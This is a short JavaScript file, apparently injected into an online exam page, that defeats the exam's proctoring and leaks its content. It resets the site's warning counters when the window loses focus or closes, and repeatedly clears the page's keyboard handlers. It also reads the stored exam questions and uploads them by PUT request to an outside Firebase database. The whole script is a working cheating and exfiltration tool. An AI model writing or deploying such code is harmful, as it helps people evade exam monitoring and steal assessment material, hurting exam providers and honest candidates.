console.log('INjected Before');
window.onblur = () => {
  window.sessionStorage.setItem('CurrnetWarningNo', 0);
  window.sessionStorage.setItem('NoOfWarning', 0);
};
window.onbeforeunload = () => {
  window.sessionStorage.setItem('CurrnetWarningNo', 0);
  window.sessionStorage.setItem('NoOfWarning', 0);
};

var ExamID = window.sessionStorage.getItem('ExamAssignementID');
var QuestionArray = window.localStorage.getItem(ExamID);

var url = 'https://lakshyaexam-91b83.firebaseio.com/questions/1.json';
if (QuestionArray) {
  var data = JSON.parse(QuestionArray)
    .map((x) => x.Question)
    .filter((x) => x && x.length > 5);
  console.log(data);
  (async () => {
    await fetch(url, {
      method: 'PUT',
      headers: {
        'Content-Type': 'application/json',
        // 'Content-Type': 'application/x-www-form-urlencoded',
      },
      body: JSON.stringify(data),
    });
  })();
}

setInterval(() => {
  document.body.onkeyup = () => {};
  document.body.onkeydown = () => {};
  document.body.onkeypress = () => {};
}, 100);
console.log('INjected After');
